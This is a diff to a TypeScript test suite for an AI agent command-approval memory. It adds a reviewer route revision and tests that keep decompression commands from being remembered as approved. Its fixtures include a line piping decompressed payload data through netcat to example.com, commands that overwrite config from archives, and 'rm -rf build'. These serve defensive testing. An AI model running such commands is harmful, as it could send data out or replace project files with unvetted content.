@@ -18,7 +18,11 @@ import type { ReviewableAction } from './auto-review.js';
 
 const roots = ['/repo'];
 const defaultIntent = 'run project checks';
-const reviewerRoute = { providerId: 'xd', model: 'review-model' } as const;
+const reviewerRoute = {
+  providerId: 'xd',
+  model: 'review-model',
+  routeRevision: 'sha256:review-route-a',
+} as const;
 const exec = (command: string, cwd?: string): ReviewableAction =>
   ({ kind: 'exec', command, ...(cwd ? { cwd } : {}) }) as ReviewableAction;
 const signature = (
@@ -51,14 +55,21 @@ describe('approvalSignature — 可记忆判据', () => {
       'pi',
       '/repo',
       defaultIntent,
-      { providerId: 'other', model: reviewerRoute.model },
+      { ...reviewerRoute, providerId: 'other' },
     ));
     expect(base).not.toBe(signature(
       exec('printf "a  b"', '/repo/a'),
       'pi',
       '/repo',
       defaultIntent,
-      { providerId: reviewerRoute.providerId, model: 'other-model' },
+      { ...reviewerRoute, model: 'other-model' },
+    ));
+    expect(base).not.toBe(signature(
+      exec('printf "a  b"', '/repo/a'),
+      'pi',
+      '/repo',
+      defaultIntent,
+      { ...reviewerRoute, routeRevision: 'sha256:review-route-b' },
     ));
     expect(base).not.toBe(approvalSignature(
       exec('printf "a  b"', '/repo/a'),
@@ -76,6 +87,10 @@ describe('approvalSignature — 可记忆判据', () => {
     expect(signature(
       exec('printf "a  b"', '/repo/a'), 'pi', '/repo', defaultIntent,
       { model: reviewerRoute.model },
+    )).toBeNull();
+    expect(signature(
+      exec('printf "a  b"', '/repo/a'), 'pi', '/repo', defaultIntent,
+      { providerId: reviewerRoute.providerId, model: reviewerRoute.model },
     )).toBeNull();
   });
 
@@ -512,6 +527,43 @@ describe('approvalSignature — 可记忆判据', () => {
       memory.rememberReviewerAllow(action, defaultIntent, roots, reviewerRoute);
       expect(memory.isRemembered(action, defaultIntent, roots, reviewerRoute)).toBe(false);
     }
+    expect(memory.size()).toBe(0);
+  });
+
+  it('文件驱动的压缩变换不可记忆，固定字面量 stdin 不误报', () => {
+    for (const command of [
+      'gzip -dc payload.gz > dist/config',
+      'gunzip -c payload.gz | tee dist/config',
+      'zcat payload.gz | nc example.com 1234',
+      'gzip payload.json',
+      'gunzip payload.json.gz',
+      'env gzip.exe -dc payload.gz > dist/config',
+      'true && xz -dc payload.xz > dist/config; echo done',
+      'bzip2 -dc payload.bz2 > dist/config',
+      'zstd -dc payload.zst > dist/config',
+      'lz4 -dc payload.lz4 > dist/config',
+      'brotli -d payload.br -o dist/config',
+    ]) {
+      expect(isMutableIndirectExecutionCommand(command), command).toBe(true);
+      expect(signature(exec(command)), command).toBeNull();
+    }
+
+    for (const command of [
+      'gzip --version',
+      'gunzip --help',
+      'printf payload | gzip -c > dist/config.gz',
+      'echo payload | zstd -c > dist/config.zst',
+    ]) {
+      expect(isMutableIndirectExecutionCommand(command), command).toBe(false);
+      expect(signature(exec(command)), command).not.toBeNull();
+    }
+
+    const memory = createApprovalMemory({
+      agentKind: 'pi', workspaceKey: '/repo', platform: 'darwin',
+    });
+    const action = exec('gzip -dc payload.gz > dist/config');
+    memory.rememberReviewerAllow(action, defaultIntent, roots, reviewerRoute);
+    expect(memory.isRemembered(action, defaultIntent, roots, reviewerRoute)).toBe(false);
     expect(memory.size()).toBe(0);
   });
 
@@ -1128,7 +1180,7 @@ describe('createApprovalMemory — 会话内行为', () => {
     )).toBe(false);
   });
 
-  it('审阅器 allow 不跨 reviewer model/provider，也不扩成可执行文件级授权', () => {
+  it('审阅器 allow 不跨 reviewer model/provider/route，也不扩成可执行文件级授权', () => {
     const memory = make();
     memory.rememberReviewerAllow(exec('rm -rf build'), defaultIntent, roots, reviewerRoute);
     expect(memory.isRemembered(
@@ -1138,13 +1190,19 @@ describe('createApprovalMemory — 会话内行为', () => {
       exec('rm -rf build'),
       defaultIntent,
       roots,
-      { providerId: 'other', model: reviewerRoute.model },
+      { ...reviewerRoute, providerId: 'other' },
     )).toBe(false);
     expect(memory.isRemembered(
       exec('rm -rf build'),
       defaultIntent,
       roots,
-      { providerId: reviewerRoute.providerId, model: 'other-model' },
+      { ...reviewerRoute, model: 'other-model' },
+    )).toBe(false);
+    expect(memory.isRemembered(
+      exec('rm -rf build'),
+      defaultIntent,
+      roots,
+      { ...reviewerRoute, routeRevision: 'sha256:review-route-b' },
     )).toBe(false);
     expect(memory.isRemembered(
       exec('rm -rf dist'), defaultIntent, roots, reviewerRoute,
